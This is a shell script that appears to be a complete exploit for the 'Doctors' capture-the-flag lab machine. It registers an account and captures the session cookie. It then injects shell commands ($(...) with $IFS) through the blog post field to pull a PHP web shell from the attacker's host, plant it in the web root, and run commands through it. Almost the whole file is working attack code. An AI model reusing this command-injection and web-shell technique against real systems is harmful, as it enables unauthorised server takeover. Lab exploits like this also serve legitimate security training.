#!/bin/sh

IP=$(ip addr | grep 10.10. | sed 's/    inet //' | sed 's/\/23 scope global tun0//')
USER=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 13)

echo "ip $IP"
echo "user $USER"

# register
curl --silent 'http://doctors.htb/register' \
  --data "username=${USER}&email=${USER}@email.com&password=password&confirm_password=password&submit=Sign+Up" > /dev/null

# login and get auth cookie
AUTH=$(curl -v 'http://doctors.htb/login' \
  --data "email=${USER}@email.com&password=password&submit=Login" 2>&1 \
  | grep 'Set-Cookie' \
  | sed 's/< Set-Cookie: session=//' \
  | sed 's/; HttpOnly; Path=\///' \
  | tr -d '[:space:]')

echo "cookie $AUTH"

# make directory for the web shell
curl --silent 'http://doctors.htb/post/new' \
  -H "Cookie: session=${AUTH}" \
  --data "title=t&content=http://${IP}:8000/\$(mkdir\$IFS/var/www/html/shell)&submit=Post" > /dev/null

# remove all the files in the temporary folder and upload the web shell to it
curl --silent 'http://doctors.htb/post/new' \
  -H "Cookie: session=${AUTH}" \
  --data "title=t&content=http://${IP}:8000/tools/short-shell.php\$(rm\$IFS./blog/flaskblog/tmp/blacklist/*)&submit=Post" > /dev/null

curl --silent 'http://doctors.htb/post/new' \
  -H "Cookie: session=${AUTH}" \
  --data "title=t&content=http://${IP}:8000/\$(cp\$IFS./blog/flaskblog/tmp/blacklist/*\$IFS/var/www/html/shell)&submit=Post" > /dev/null

curl --silent 'http://doctors.htb/post/new' \
  -H "Cookie: session=${AUTH}" \
  --data "title=t&content=http://${IP}:8000/\$(ls\$IFS/var/www/html/shell>./blog/flaskblog/static/out)&submit=Post" > /dev/null

SHELL=$(curl --silent 'http://doctors.htb/static/out' | tr -d '[:space:]')

curl --silent 'http://doctors.htb/post/new' \
  -H "Cookie: session=${AUTH}" \
  --data "title=t&content=http://${IP}:8000/\$(mv\$IFS/var/www/html/shell/${SHELL}\$IFS/var/www/html/shell/shell.php)-&submit=Post" > /dev/null

echo "\nWeb shell is at http://doctor.htb/shell/shell.php?system=cmd"

#while true;do
# echo -n "\n$ "; read cmd
# curl --silent -G "http://doctor.htb/shell/shell.php" --data-urlencode "system=${cmd}"
#done

curl --silent -G "http://doctor.htb/shell/shell.php" --data-urlencode "system=${cmd}"